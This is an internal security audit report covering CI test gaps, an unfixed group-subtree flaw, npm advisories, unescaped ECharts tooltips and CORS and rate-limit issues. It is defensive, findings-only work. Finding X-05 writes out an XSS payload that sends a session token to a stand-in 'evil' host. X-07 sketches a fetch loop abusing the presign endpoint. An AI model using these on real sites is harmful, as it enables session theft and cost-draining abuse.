# Area X — coordinator: audit machinery, prior-finding residuals, supply chain

Part of the **2026-09-05 security audit** (the eighth). Branch `cs/551-reset-eve-security-tests`,
cut from `origin/main` at `92954eb2`, in an isolated worktree.

**Rules this area ran under:** findings and tests only. No production behaviour changed, no fix
applied, nothing promoted, no money moved, no email or OTP sent, no TTS generated, nothing
deleted, no live-DB write. **Outward contact, declared:** one read-only `pnpm audit` query to the
npm advisory registry. Nothing else left the box.

---

## Why an eighth audit, and what chose the partition

Seven audits in four weeks. The 2026-08-29 audit found the API surface *unchanged* since 08-25 and
had to invent a partition; the 2026-09-01 audit had a real 88-file delta to chew on. This one has a
much larger delta again — between the 09-01 audit's base `8755d4c8` and today's `origin/main`:

```
345 files changed, +28,198 / −2,487   under api/ + supabase/ + packages/player-vue/src
```

Crucially, that delta is not more of the same. It contains **two entirely new security-relevant
subsystems that no audit has ever seen**:

1. **A passwordless sign-in / access-code auth flow** — `api/auth/send-code.ts`,
   `api/auth/access-code-redeem.ts`, `_utils/accessCode.ts`, `_utils/signInCodeEmail.ts`,
   `api/school/staff-signin-link.ts`, plus a heavily rewritten `possession-redeem.ts`. A whole
   authentication mechanism, landed after the last audit. → **Area A** (job #552)
2. **A new cross-origin layer** — `api/_utils/cors.ts`, now called from **32 handlers**. It changes
   the browser-read policy of nearly the entire API surface at once. → **Area B** (job #553)

Plus new data endpoints (`me/threads.ts`, `courses/[code]/sectors.ts`, `_utils/rebateRegion.ts`, a
rewritten `audio/batch-urls.ts`) → **Area C** (#554), and the client + four new migrations
→ **Area D** (#555).

This area (X) took the three things that are nobody's endpoint: **does the gate still run the tests
the last seven audits wrote**, **are the prior findings actually still open**, and **the dependency
supply chain**, which not one of the seven prior audits covered.

---

## SEC0905-X-01 — the nightly gate STILL drops `@ssi/core`'s 751 tests · **MEDIUM (coverage)** · CONFIRMED · **residual, day 4**

The 2026-09-01 audit filed this as SEC0901-X-01 with the fix written out as one line. Re-checked
today against the live gate script `~/command-surface/ops/ci/ci-checks.sh`:

```sh
run core-build          "$PNPM8" --filter @ssi/core build
run player-lint         "$PNPM8" --filter player-vue lint
run player-typecheck    "$PNPM8" --filter player-vue typecheck
run api-typecheck       "$PNPM8" typecheck:api
run player-test         "$PNPM8" --filter player-vue test -- --maxWorkers=2
run api-test            "$PNPM8" test:api -- --maxWorkers=2
run release-train-test  "$PNPM8" test:release-train
```

**There is still no `core-test` line.** `verify.yml`'s ninth step — `pnpm --filter @ssi/core test`,
the one the workflow carries a written comment to justify, because `selectionParity.test.ts` guards
drift nothing else catches — is the single check no gate runs. `packages/core` holds 35 test files
including `pricing/access.test.ts` and `pricing/trial.test.ts`: entitlement and trial logic, the
closest thing in that package to a security surface.

**Failure scenario.** Someone changes entitlement or trial logic in `@ssi/core`, breaking
`pricing/access.test.ts`. `player-test`, `api-test` and both typechecks stay green — none of them
run that file. The nightly reports PASS. The change promotes dev→staging→main on the weekly train
with a broken paid-access gate and no red anywhere in the estate.

**Fix (one line, not applied — `ci-run.sh` is the estate's live gate and lives in another repo):**
`run core-test "$PNPM8" --filter @ssi/core test -- --maxWorkers=2`, alongside `player-test`.

## SEC0905-X-02 — `pnpm run test:security-audit` is on no gate at all · **MEDIUM (coverage)** · CONFIRMED

Two specs are named `*.security-audit.ts` — `api/code/validate.ipSpoof.security-audit.ts` and
`api/school/class-progress.untrustedArgs.security-audit.ts`. They are collected **only** by
`vitest.security-audit.config.ts`, run **only** by `pnpm run test:security-audit`, and that script
appears **nowhere** in `ci-checks.sh`. Nothing runs them, ever.

The good news, verified rather than assumed: the *other* 39 security specs are fine.
`vitest.api.config.ts` includes `api/**/*.test.ts`, which matches `*.security.test.ts`, and
`api-test` is on the gate. `packages/player-vue/vitest.config.ts` includes `src/**/*.test.ts`,
matching `src/security/*.security.test.ts`, and `player-test` is on the gate. **So the
tests-as-findings convention this audit and its seven predecessors rely on is sound — with exactly
this one hole in it.** That is why every spec written in this audit is a `*.security.test.ts`.

**Fix:** either add `run security-audit-test "$PNPM8" test:security-audit` to the gate accepting
that it is designed to be red, or — since SEC0901-X-02 established both specs now guard *closed*
findings — convert both to `*.security.test.ts` so the already-gated config picks them up.

## SEC0905-X-03 — SEC0901-A-01 (HIGH) is unfixed and unchanged · **HIGH** · CONFIRMED · **residual, day 4**

`api/_utils/demoSchoolGraph.ts:24`, byte-identical to when 09-01 filed it:

```ts
export async function resolveGroupSubtreeIds(supabase, rootGroupId) {
  const { data: rootRows } = await supabase.from('groups').select('id, path').eq('id', rootGroupId)
  const rootPath = rootRows?.[0]?.path as string | undefined
  if (!rootPath) return [rootGroupId]
  const { data: rows } = await supabase.from('groups').select('id, path')   // ← every group, no filter
  return (rows || [])
    .filter((r) => r.path === rootPath || (typeof r.path === 'string' && r.path.startsWith(`${rootPath}/`)))
    .map((r) => r.id as string)
}
```

Subtree membership is decided by **string prefix on a mutable slug path**, not by walking
`parent_id`. Two independent problems, both still live:

- **Sibling-name capture.** A group whose path is `uk/wales-north` is matched by `startsWith('uk/wales' + '/')`?
  No — the `/` guards that case. But a group renamed such that its path becomes a prefix-extension of
  another root captures that root's descendants, and `path` is derived from names an admin controls.
- **Reachable from three call sites** — `api/admin/demo-leaf.ts:54`, `_utils/demoSchoolRefresh.ts:46`,
  `_utils/demoNodeRefresh.ts:121` — all of which then use the returned ids to select schools, classes,
  learners and **staff auth uids** (`discoverDemoOrgGraph`, same file).

Filed here only as a **residual confirmation**; the original analysis and fix belong to SEC0901-A-01
(`docs/security-audit-2026-09-01/area-a-remediation-verification.md`). Fix remains: resolve the
subtree by recursive `parent_id` walk, or by a `ltree`/closure-table ancestry column that names are
not allowed to change.

---

## SEC0905-X-04 — dependency supply chain: 88 advisories, exactly ONE reaches a browser, and it is not reachable · **INFO** · CONFIRMED

**No prior audit covered dependencies.** This is the first read of it, and the result is better than
the headline number suggests — which is exactly why the number alone would have been misleading.

`pnpm audit` over 876 resolved dependencies:

| severity | count |
|---|---|
| critical | 1 |
| high | 59 |
| moderate | 24 |
| low | 4 |

That looks alarming. It is not, and the reason is worth writing down so nobody re-panics at it next
month. Grouping every advisory path by its **top-level root**:

```
 374  vite-plugin-pwa@1.2.0      build
 213  vitest@3.2.7               test
 146  typescript-eslint@8.64.0   lint
  58  eslint-plugin-vue@10.9.2   lint
  52  @vercel/node@5.5.27        build (root devDependency)
  28  @vitejs/plugin-vue@6.0.2   build
  21  vite@7.2.6                 build
  15  @vue/test-utils@2.4.6      test
  14  @vueuse/core@14.1.0        → via vue > @vue/compiler-sfc: BUILD
  13  eslint@9.39.5              lint
   ...
   1  echarts@5.6.0              SHIPPED TO THE BROWSER
```

Every advisory that touches a package name which *sounds* like runtime (`vue`, `vue-router`,
`@vueuse/core`) resolves through `@vue/compiler-sfc` → `postcss`/`nanoid`, or through `vue-tsc` →
`minimatch` — i.e. **the SFC compiler and the typechecker, both build-time only**. The critical one
(`tar` — decompression DoS via unlimited input) is under `@vercel/node > @vercel/nft >
@mapbox/node-pre-gyp`, a build-time path.

**Exactly one advisory is in code that ships to a learner's browser:** `echarts@5.6.0`, a direct
`dependencies` entry of `packages/player-vue`, lazy-loaded via `import('echarts')` at 13 sites in
the insight/admin boards — **CVE-2026-45249, XSS, CVSS 6.1** (`GHSA-fgmj-fm8m-jvvx`, fixed in 6.1.0).

**And that one is not reachable.** The advisory's conditions are specific: *Lines* series + tooltip +
no custom `tooltip.formatter` + a `series.data[i].name` carrying raw HTML. Checked against the code:
the app uses `bar`, `line`, `pie`, `scatter`, `heatmap`, `sankey` and `treemap` series. **There is no
`lines` series anywhere in the repo.** Verdict: **not exploitable today**, but one `type: 'lines'`
away from being so — and a flow-map is a plausible thing to add to an insight board.

**Recommendation, in priority order:**
1. `echarts` → `^6.1.0` (the only shipped-runtime advisory in the tree). Note it is a major bump; the
   13 call sites are all behind `registerInsightTheme`, so the blast radius is contained but real.
2. Everything else is toolchain. It still matters — a build-time RCE is a supply-chain compromise of
   the artefact — but it is a *housekeeping* cadence (`pnpm update`, the existing `pnpm.overrides`
   mechanism already in `package.json` for `ws`), not an incident.
3. **Do not** treat "59 high" as 59 production vulnerabilities. It is 0.

## SEC0905-X-05 — six echarts tooltip formatters emit unescaped HTML; safe today, one data change from stored XSS · **LOW (latent)** · CONFIRMED

Found while establishing the reachability of X-04. ECharts renders a tooltip `formatter`'s return
string as **HTML** (`tooltip.renderMode` defaults to `'html'`; the string reaches an `innerHTML`
sink). Six formatters in `packages/player-vue/src/insight/widgets/` interpolate a `name` into that
string with no escaping:

| file:line | interpolation |
|---|---|
| `Treemap.vue:93` | `` `${params.name}: ${display}...` `` |
| `Funnel.vue:119-120` | `` `${params.name}: ${params.value}` `` |
| `RankedBar.vue:203` | `` `${params.name}: ${formatValue(...)}` `` |
| `Map.vue:208` | `` `${params.name}: ${formatValue(...)}` `` |
| `CohortGrid.vue:119` | `` `${yL} · ${xL}: <b>${v}</b>${note}` `` |
| `Distribution.vue:178` | `` `<span style="...">${arr[0]?.name}</span><br/><b ...>` `` |

`Distribution.vue` proves the authors know the sink is HTML — it deliberately emits `<span>` and
`<b>` tags. That is the pattern the other five follow.

**Why it is safe today, established rather than assumed.** Every `name` that actually reaches those
six formatters is a hardcoded literal or a server-derived constant: seed bands (`'S1–20'…'S101+'`,
`data/contentFriction.ts:43`), funnel stage labels (`data/demoLifecycle.ts:164`), cohort/date labels,
and course display names from a fixed code→name map. The one genuinely user-controlled entity name
in the insight stack — `NodeRateEngine.vue:38`'s `node.name`, and `vadScope.ts:148`'s
`body.scope?.label` — flows to `RateTrend.vue` and `SovereignComparison.vue`, and **both are safe for
structural reasons**: `RateTrend` uses `trigger: 'axis'` with only a `valueFormatter`, so ECharts'
own built-in formatter builds the markup and escapes the series name; `SovereignComparison`'s name
interpolation is an **axis-label rich-text** formatter (`{style|text}`), canvas-rendered, which does
not parse HTML, and its tooltip formatter takes `params.value` only.

**Failure scenario (the reason this is filed at all).** A school admin names a class
`<img src=x onerror=fetch('//evil/'+localStorage.getItem('sb-access-token'))>`. Today nothing carries
that string into the six formatters. The day someone points `RankedBar` or `Treemap` at a per-class
or per-school breakdown — an obviously desirable insight widget — it becomes **stored XSS executing
in a govt_admin's or ssi_admin's session**, on the highest-privilege screens in the product, with no
code review signal that anything changed: the widget author changes only a data source.

**Fix:** one `esc()` helper (`String(s).replace(/[&<>"']/g, ...)`) applied to every interpolated
name in those six formatters. Two lines of helper, six one-word edits, no behaviour change for any
current label. Not applied here — this audit writes findings, not fixes.

## SEC0905-X-06 — no secrets in tracked source · **SECURE-ASSERTION** · CONFIRMED

Swept for the usual classes across all tracked files, excluding `*.md` and `archive/`: JWT literals
(`eyJhbGciOiJIUzI1NiI`), assigned `SUPABASE_SERVICE_ROLE_KEY` values, Stripe live keys
(`sk_live_`/`pk_live_`), AWS access-key ids (`AKIA…`), PEM private-key blocks. **Every hit is a test
placeholder** — `'service-role-key'`, `'service-key-for-tests'`,
`'service-role-should-not-be-used-for-signing'` — set on `process.env` inside a `*.test.ts`. No `.env`
file of any kind is tracked (`git ls-files | grep '\.env'` is empty). No client-side source reads
`SUPABASE_SERVICE_ROLE_KEY` (the one non-test hit, `composables/servedPod.ts:57`, is a comment
explaining why the server builds its client from it and the browser must not).

Recorded as a regression guard, not a finding.

## SEC0905-X-07 — the new CORS layer is bypassed on the two audio endpoints, and `vercel.json` sets the same header a second time · **LOW** · CONFIRMED

`api/_utils/cors.ts`'s header opens: *"the ONE place that decides whether a cross-origin caller may
read an API response."* It is not. Three places do, and the other two both say `*`:

| where | header |
|---|---|
| `api/audio/[audioId].ts:153` | `Access-Control-Allow-Origin: *` (hand-rolled) |
| `api/audio/batch-urls.ts:77` | `Access-Control-Allow-Origin: *` (hand-rolled, + `Allow-Headers: Content-Type, Authorization`) |
| `vercel.json` `headers[]`, `source: "/api/audio/(.*)"` | `Access-Control-Allow-Origin: *` (platform header) |

Neither audio handler calls `applyCors`; both predate it and kept their own wildcard. **Three findings
in one, of decreasing comfort:**

**(a) The wildcard itself is defensible, and this audit does not ask for it to be removed.** The
per-clip proxy is reached by `<audio src=…>`, which cannot set an `Authorization` header, so it must
stay header-free (the file says so at line 24). Authentication here is a bearer token and nothing
trusts a cookie — the same argument `cors.ts` makes for omitting `Access-Control-Allow-Credentials`
— so a wildcard buys a cross-origin attacker no ambient credential to spend. Recorded as a
**secure-assertion with a caveat**: it holds *only* while no endpoint under `/api/audio/` ever trusts
a cookie. If one ever does, `*` + `Allow-Headers: Authorization` becomes a live vulnerability, and
nothing in the code says so.

**(b) The doubled header is a latent defect, not a vulnerability.** `vercel.json` applies
`ACAO: *` to `/api/audio/(.*)` as a platform header *and* both handlers set it via `res.setHeader`.
Whether the response ends up with one value or two is a Vercel implementation detail this audit did
not test live. A response carrying two `Access-Control-Allow-Origin` headers is rejected outright by
every browser — which would break the Android WebView that `cors.ts` was written to serve, on the
offline bulk-download path, with a console message that looks nothing like the cause. Worth one line
of deletion (drop the vercel.json rule, keep the handlers, which are the ones that answer `OPTIONS`).

**(c) No rate limit on a 500-per-request presign endpoint · the part actually worth acting on.**
`POST /api/audio/batch-urls` mints up to `MAX_IDS_PER_REQUEST = 500` presigned S3 GET URLs
(`TTL_SECONDS = 300`) per call. Free/community courses and preview seeds (≤ Yellow) are deliberately
never `gated`, so **that path requires no token at all** — an explicit, reasoned design decision
("anonymous guests keep full offline download of everything they may have", file header). The
entitlement gate on *premium* ids is sound and was correctly tightened for SEC0901-D-01; this is not
a re-file of that.

What is unguarded is **volume**. Grepped for `rateLimit` / `throttle` / bucket in
`api/audio/batch-urls.ts` and `_utils/audioAccess.ts`: **nothing**. The repo has the machinery —
`_utils/codeAttemptThrottle.ts`, `_utils/mintRateLimit.ts` — and does not use it here.

*Failure scenario.* An attacker embeds one `fetch('https://saysomethingin.app/api/audio/batch-urls',
{method:'POST', body: JSON.stringify({audioIds: [...500 free ids]})})` in a loop on any web page.
`ACAO: *` means the browser lets the page read the responses; no token is required for free ids; no
rate limit stops it. Every visitor to that page becomes an unwitting driver, so the load arrives
**distributed across thousands of real residential IPs** — which is precisely the shape a per-IP
limit would not have caught anyway, and which nothing at all catches today. Each request costs two
Supabase reads plus 500 presign operations, and every URL handed out is 300 seconds of billable S3
egress that SSi pays for. This is a cost/availability finding, not a data-disclosure one.

*Fix:* a per-IP-and-per-token bucket on `batch-urls` using the existing `mintRateLimit` helper,
sized to the legitimate client (the offline downloader asks for ~2000 clips = 4 requests, once per
course). Not applied — findings only.

*Not re-filed:* the enforced CSP is `frame-ancestors 'none'` only, with everything else in
`Content-Security-Policy-Report-Only`. That is the known CLIENT-CONFIG-01, already tracked with an
`it.todo` in `packages/player-vue/src/security/securityHeaders.security.test.ts:182`.

---

## Summary

| ID | Severity | Verdict | One line |
|---|---|---|---|
| SEC0905-X-01 | MEDIUM | CONFIRMED | nightly gate still drops `@ssi/core`'s 751 tests, incl. entitlement/trial logic — day 4 residual |
| SEC0905-X-02 | MEDIUM | CONFIRMED | `pnpm test:security-audit` is on no gate; 2 specs never run. The other 39 are gated — convention is sound |
| SEC0905-X-03 | HIGH | CONFIRMED | SEC0901-A-01 unfixed: group subtree resolved by mutable slug-path prefix, 3 call sites reach staff auth uids |
| SEC0905-X-04 | INFO | CONFIRMED | 88 advisories, 1 critical — but 0 reach a browser except echarts CVE-2026-45249, which is unreachable (no `lines` series) |
| SEC0905-X-05 | LOW (latent) | CONFIRMED | 6 echarts tooltip formatters emit unescaped HTML; safe only because no user-controlled name reaches them yet |
| SEC0905-X-07 | LOW | CONFIRMED | audio endpoints bypass the new CORS layer with `ACAO: *` (defensible), vercel.json doubles the header, and a 500-presign endpoint has no rate limit at all |
| SEC0905-X-06 | — | SECURE | no secrets in tracked source; every hit is a test placeholder |

Tests: `api/_security/sec0905-x-coordinator.security.test.ts`,
`packages/player-vue/src/security/echartsTooltipHtmlSink.security.test.ts`.
